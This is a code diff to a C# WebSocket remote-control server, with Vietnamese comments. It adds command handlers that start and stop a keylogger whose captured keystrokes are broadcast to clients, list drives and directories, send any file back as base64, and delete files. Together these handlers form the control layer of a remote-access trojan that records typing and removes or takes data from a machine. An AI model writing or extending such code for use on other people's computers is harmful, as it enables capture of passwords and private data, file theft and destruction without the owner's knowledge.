@@ -7,7 +7,11 @@ using System.Threading.Tasks;
 using Fleck;
 using Newtonsoft.Json;
 
-namespace RemoteControlServer
+using RemoteControlServer.Models;
+using RemoteControlServer.Helpers;
+using RemoteControlServer.Services;
+
+namespace RemoteControlServer.Core
 {
     public class ServerCore
     {
@@ -323,6 +327,74 @@ public static void BroadcastLog(string message)
                             SendJson(socket, "LOG", result);
                             break;
 
+                        case "START_KEYLOG":
+                            if (!KeyLoggerService.IsRunning)
+                            {
+                                // Chạy Keylogger và gửi kết quả về client
+                                KeyLoggerService.StartHook((key) => {
+                                    BroadcastLog($"[Keylogger] {key}");
+                                });
+                                SendJson(socket, "LOG", "Keylogger: Đã BẬT ghi phím.");
+                            }
+                            else
+                            {
+                                SendJson(socket, "LOG", "Keylogger đang chạy rồi!");
+                            }
+                            break;
+
+                        case "STOP_KEYLOG":
+                            if (KeyLoggerService.IsRunning)
+                            {
+                                KeyLoggerService.StopHook();
+                                SendJson(socket, "LOG", "Keylogger: Đã TẮT ghi phím.");
+                            }
+                            else
+                            {
+                                SendJson(socket, "LOG", "Keylogger chưa được bật.");
+                            }
+                            break;
+                        
+                        case "GET_DRIVES": // Lấy danh sách ổ đĩa
+                            SendJson(socket, "FILE_LIST", FileManagerService.GetDrives());
+                            break;
+
+                        case "GET_DIR": // Lấy nội dung thư mục
+                            SendJson(socket, "FILE_LIST", FileManagerService.GetDirectoryContent(packet.param));
+                            break;
+
+                        case "DOWNLOAD_FILE": // Tải file về
+                            string base64File = FileManagerService.GetFileContentBase64(packet.param);
+                            if (base64File == "ERROR_SIZE_LIMIT")
+                            {
+                                SendJson(socket, "LOG", "Lỗi: File quá lớn (>50MB) để tải qua Web!");
+                            }
+                            else if (base64File != null)
+                            {
+                                // Gửi gói tin đặc biệt chứa tên file và nội dung
+                                var payload = new { fileName = System.IO.Path.GetFileName(packet.param), data = base64File };
+                                SendJson(socket, "FILE_DOWNLOAD_DATA", payload);
+                                SendJson(socket, "LOG", "Đang tải xuống: " + System.IO.Path.GetFileName(packet.param));
+                            }
+                            else
+                            {
+                                SendJson(socket, "LOG", "Lỗi: Không đọc được file!");
+                            }
+                            break;
+
+                        case "DELETE_FILE": // Xóa file
+                            // Thêm ngoặc nhọn {} để tránh lỗi trùng tên biến result
+                            { 
+                                string deleteResult = FileManagerService.DeleteFile(packet.param);
+                                if (deleteResult == "OK")
+                                {
+                                    SendJson(socket, "LOG", "Đã xóa file thành công!");
+                                }
+                                else
+                                {
+                                    SendJson(socket, "LOG", deleteResult);
+                                }
+                                break;
+                            }
                     }
                 }
             }
